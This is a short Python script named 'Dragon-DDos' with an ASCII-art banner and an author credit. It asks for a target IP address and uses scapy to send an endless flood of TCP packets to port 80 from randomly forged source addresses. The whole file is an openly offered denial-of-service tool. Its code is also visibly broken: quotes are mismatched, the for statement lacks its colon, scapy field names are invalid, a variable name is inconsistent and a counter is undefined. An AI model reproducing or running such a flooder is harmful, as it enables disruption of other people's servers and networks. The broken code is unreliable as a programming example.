#Dragon-DDos
import random
from scapy.all import *
	

print" ____ "                                   ____  ____       "
print"|  _ \ _ __ __ _  __ _  ___  _ __       |  _ \|  _ \  ___  ___"
print"| | | | '__/ _` |/ _` |/ _ \| '_ \ _____| | | | | | |/ _ \/ __|"
print"| |_| | | | (_| | (_| | (_) | | | |_____| |_| | |_| | (_) \__ \"
print"|____/|_|  \__,_|\__, |\___/|_| |_|     |____/|____/ \___/|___/"
print"                  |___/"
print"                        "
print"by Mohamed Aly Sidi Mohamed"
             


print"-------------------------------------------"
target_IP = input("Enter IP address of Target: ")
print"--------------------------------------------"

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
  
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
    
      print ("packet sent ", i)
         i = i + 1
